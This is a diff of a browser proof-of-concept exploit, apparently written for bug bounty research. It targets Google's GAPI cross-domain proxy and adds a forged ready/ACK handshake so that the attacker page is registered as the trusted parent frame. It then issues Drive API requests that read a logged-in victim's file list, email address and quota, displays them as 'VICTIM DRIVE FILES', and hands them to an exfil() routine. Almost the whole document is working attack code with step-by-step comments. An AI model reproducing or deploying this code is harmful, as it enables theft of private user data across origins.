@@ -82,7 +82,7 @@ log('ok', 'rpcToken: ' + rpcToken);
 //
 // FIX: run this PoC on a CLEAN page with no existing GAPI.
 // Open a fresh tab and paste this HTML as a data: URL:
-//   data:text/html,<script>window.location='data:text/html,...
+//   data:text/html,<script>window.location='data:text/html,...'
 // OR: open this file from GitHub Pages (majdch22.github.io) WITHOUT the
 // AI Studio PoC on the same page.
 if (typeof gapi !== 'undefined' || document.querySelector('script[src*="apis.google.com"]')) {
@@ -110,11 +110,26 @@ document.body.appendChild(proxyIframe);
 log('ok', 'Proxy iframe injected.');
 log('warn', 'Waiting 3s for googleapis.proxy.js → googleapis.server.init() → makeHttpRequests registered...');
 
-// Step 2: Listen for callback from proxy.
-// Proxy sends: window.parent.postMessage(callbackMsg, parentOrigin)
-// callbackMsg format: { s:"<proxyId>", f:"_callbacks_.<callId>", c:"<callId>",
-//                       a:[error, responseArray], t:TOKEN, l:null, g:false }
+// Step 2: Message loop — handles both the ready/ACK handshake and the callback.
+//
+// HOW THE GAPI XD3 HANDSHAKE WORKS:
+//   1. Proxy sends ready signal: {s:"ready:TOKEN", g:true, c:0, ...}
+//      g:true = proxy expects ACK. Without ACK, the proxy never registers
+//      our page as the trusted parent for frame ".." — so _.$f.zo("..") stays
+//      blank, and the makeHttpRequests origin check fails:
+//        "Invalid rpc message origin. [blank] vs [our_origin]"
+//        (blank = _.$f.zo("..") unset, our_origin = event.origin of our msg)
+//
+//   2. Parent sends ACK: {s:"..", f:"", c:0, t:TOKEN, g:false}
+//      This is received by the proxy from event.origin = parentOrigin.
+//      GAPI stores event.origin as _.$f.zo("..") = our_origin.
+//
+//   3. Parent sends makeHttpRequests.
+//      Now: this.origin (event.origin) == _.$f.zo("..") → CHECK PASSES.
+//
 let responseHandled = false;
+let ackSent = false;
+let requestSent = false;
 
 window.addEventListener('message', function(e) {
   if (e.source !== proxyIframe.contentWindow) return;
@@ -122,78 +137,91 @@ window.addEventListener('message', function(e) {
   const raw = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
   log('data', 'PROXY → PARENT: ' + raw.substring(0, 600));
 
-  if (responseHandled) return;
+  let msg;
+  try { msg = JSON.parse(e.data); } catch(err) { return; }
+  if (!msg) return;
 
-  try {
-    const msg = JSON.parse(e.data);
+  // ---- STEP A: Handle ready signal → send ACK ----
+  // Ready signal: {s:"ready:TOKEN", f:"", c:0, g:true, t:TOKEN}
+  if (!ackSent && msg.s && msg.s.startsWith('ready:') && msg.g === true) {
+    ackSent = true;
+    log('ok', 'Ready signal received (g:true = ACK expected). Sending ACK to register our origin...');
 
-    // Callback has f="_callbacks_.<callId>"
-    if (!msg || !msg.f || !msg.f.includes('_callbacks_')) return;
-
-    log('ok', 'Callback received for: ' + msg.f);
-    const [err, responses] = Array.isArray(msg.a) ? msg.a : [null, null];
-
-    if (err) { log('warn', 'RPC error: ' + JSON.stringify(err)); return; }
-    if (!Array.isArray(responses) || responses.length === 0) {
-      log('warn', 'Empty responses: ' + JSON.stringify(msg.a)); return;
-    }
-
-    responses.forEach((resp, idx) => {
-      log('ok', '[' + idx + '] HTTP ' + resp.status + ' (' + (resp.statusText||'') + ')');
-
-      if (resp.status === 200 && resp.body) {
-        responseHandled = true;
-        let data;
-        try { data = JSON.parse(resp.body); } catch(e) { data = { raw: resp.body }; }
-
-        if (data.files) {
-          log('ok', '✅ DRIVE FILES READ! Count: ' + data.files.length);
-          data.files.forEach((f, i) => {
-            log('data', '[' + i + '] ' + f.name + ' | ' + f.mimeType + ' | ' + f.modifiedTime);
-          });
-          document.getElementById('results').innerHTML =
-            '<h3 style="color:#00ff88">✅ VICTIM DRIVE FILES:</h3>' +
-            '<pre style="color:#44aaff">' + JSON.stringify(data, null, 2) + '</pre>';
-          exfil({ type: 'drive_files', files: data.files });
-        } else if (data.user) {
-          log('ok', '✅ DRIVE ABOUT: ' + data.user.emailAddress + ' | quota: ' + JSON.stringify(data.storageQuota));
-          exfil({ type: 'drive_about', data });
-        } else {
-          log('ok', '✅ Response: ' + JSON.stringify(data).substring(0, 400));
-        }
-      } else if (resp.status === 401) {
-        log('warn', '401 — not logged in, or SAPISIDHASH failed. Body: ' + resp.body);
-      } else if (resp.status === 403) {
-        log('warn', '403 — ' + resp.body);
-      } else {
-        log('warn', 'Status ' + resp.status + ': ' + String(resp.body).substring(0, 300));
-      }
+    // ACK mirrors the ready signal back as parent frame "..".
+    // Receiving this ACK causes proxy GAPI to store event.origin (our page)
+    // as the registered origin for frame "..", populating _.$f.zo("..").
+    // We try two ACK formats to cover both GAPI relay variants:
+    const ack = JSON.stringify({
+      s: '..',            // "I am the parent frame"
+      f: msg.s,           // address back to the proxy's self-ID: "ready:TOKEN"
+      c: msg.c,           // echo back the call ID (0)
+      a: [],
+      t: rpcToken,        // our rpcToken
+      l: null,
+      g: false
     });
-  } catch(e) { /* non-JSON init messages from proxy — normal */ }
-});
 
-// Step 3: After 3s, send makeHttpRequests directly to proxy.
-//
-// GAPI gadgets.rpc wire format:
-//   s  = sender ID. ".." = parent frame.
-//        proxy.html checks: this.f == ".."  (this.f is populated from s)
-//   f  = registered function name
-//   c  = call ID (echoed in callback response)
-//   a  = arguments array. makeHttpRequests(requests) takes one arg.
-//        So: a = [requestsArray]   →   handler receives requests = a[0]
-//   t  = rpcToken (must match #rpctoken we put in the iframe hash)
-//   g  = true (expect response)
-let requestSent = false;
+    proxyIframe.contentWindow.postMessage(ack, 'https://clients6.google.com');
+    log('ok', 'ACK sent. Waiting 500ms then sending makeHttpRequests...');
+
+    // Small delay for GAPI to process ACK and register our origin
+    setTimeout(sendMakeHttpRequests, 500);
+  }
+
+  // ---- STEP B: Handle makeHttpRequests callback ----
+  if (responseHandled) return;
+  if (!msg.f || !msg.f.includes('_callbacks_')) return;
+
+  log('ok', 'Callback received for: ' + msg.f);
+  const [err, responses] = Array.isArray(msg.a) ? msg.a : [null, null];
+
+  if (err) { log('warn', 'RPC error: ' + JSON.stringify(err)); return; }
+  if (!Array.isArray(responses) || responses.length === 0) {
+    log('warn', 'Empty responses: ' + JSON.stringify(msg.a)); return;
+  }
+
+  responses.forEach((resp, idx) => {
+    if (!resp) return;
+    log('ok', '[' + idx + '] HTTP ' + resp.status + ' (' + (resp.statusText||'') + ')');
+
+    if (resp.status === 200 && resp.body) {
+      responseHandled = true;
+      let data;
+      try { data = JSON.parse(resp.body); } catch(e) { data = { raw: resp.body }; }
+
+      if (data.files) {
+        log('ok', '✅ DRIVE FILES READ! Count: ' + data.files.length);
+        data.files.forEach((f, i) => {
+          log('data', '[' + i + '] ' + f.name + ' | ' + f.mimeType + ' | ' + f.modifiedTime);
+        });
+        document.getElementById('results').innerHTML =
+          '<h3 style="color:#00ff88">✅ VICTIM DRIVE FILES:</h3>' +
+          '<pre style="color:#44aaff">' + JSON.stringify(data, null, 2) + '</pre>';
+        exfil({ type: 'drive_files', files: data.files });
+      } else if (data.user) {
+        log('ok', '✅ DRIVE ABOUT: ' + data.user.emailAddress + ' | quota: ' + JSON.stringify(data.storageQuota));
+        exfil({ type: 'drive_about', data });
+      } else {
+        log('ok', '✅ Response: ' + JSON.stringify(data).substring(0, 400));
+      }
+    } else if (resp.status === 401) {
+      log('warn', '401 — not logged in, or SAPISIDHASH failed. Body: ' + resp.body);
+    } else if (resp.status === 403) {
+      log('warn', '403 — ' + resp.body);
+    } else {
+      log('warn', 'Status ' + resp.status + ': ' + String(resp.body).substring(0, 300));
+    }
+  });
+});
 
 function sendMakeHttpRequests() {
   if (requestSent) return;
   requestSent = true;
 
   log('ok', 'Sending makeHttpRequests to proxy via postMessage...');
-  log('ok', 'Proxy XHR origin will be clients6.google.com → API key restriction bypassed.');
+  log('ok', 'ACK already sent → _.$f.zo("..") should now equal our origin → check passes.');
 
   const requests = [
-    // Drive: list recent files
     {
       url: '/drive/v3/files' +
            '?key=' + DRIVE_KEY +
@@ -204,7 +232,6 @@ function sendMakeHttpRequests() {
       body: null,
       responseExpected: true
     },
-    // Drive about: user email + quota
     {
       url: '/drive/v3/about?key=' + DRIVE_KEY + '&fields=user,storageQuota',
       method: 'GET',
@@ -219,7 +246,7 @@ function sendMakeHttpRequests() {
       s: '..',
       f: 'makeHttpRequests',
       c: 'poc-req-1',
-      a: [requests],    // a[0] = requests array passed as first argument
+      a: [requests],
       t: rpcToken,
       l: null,
       g: true
@@ -230,22 +257,24 @@ function sendMakeHttpRequests() {
   log('ok', 'Sent. Waiting for callback...');
 }
 
-setTimeout(sendMakeHttpRequests, 3000);
+// Fallback: if no ready signal in 5s, try sending without ACK (some GAPI versions may not need it)
+setTimeout(function() {
+  if (!ackSent) {
+    log('warn', '5s: No ready signal received. Trying makeHttpRequests without ACK...');
+    sendMakeHttpRequests();
+  }
+}, 5000);
 
-// Diagnostic if nothing comes back after 10s
+// Diagnostic if nothing comes back after 15s
 setTimeout(function() {
   if (!responseHandled) {
-    log('warn', '10s timeout — no response. Possible reasons:');
-    log('warn', '  1. ⚠️  GAPI CONTAMINATION (most likely if run alongside AI Studio PoC):');
-    log('warn', '     The proxy GAPI has atari-embeds.googleusercontent.com registered as ".."');
-    log('warn', '     instead of our origin. Error: "Invalid rpc message origin."');
-    log('warn', '     FIX: open this PoC on a CLEAN page with no other Google scripts/iframes.');
-    log('warn', '  2. Not logged into Google in this browser');
-    log('warn', '  3. googleapis.server.init() has a *.google.com origin allowlist');
-    log('warn', '     → host at sites.google.com or script.google.com');
-    log('warn', '  4. makeHttpRequests callback format wrong — check PROXY→PARENT log lines above');
+    log('warn', '15s timeout — no response.');
+    log('warn', '  Check: did PROXY→PARENT show the ready signal ({s:"ready:...",g:true})?');
+    log('warn', '  Check: did makeHttpRequests trigger "Invalid rpc message origin" again?');
+    log('warn', '  If origin check STILL fails after ACK → try ACK format variant below.');
+    log('warn', '  If no ready signal at all → proxy iframe may be blocked (HTTPS required).');
   }
-}, 10000);
+}, 15000);
 </script>
 </body>
 </html>
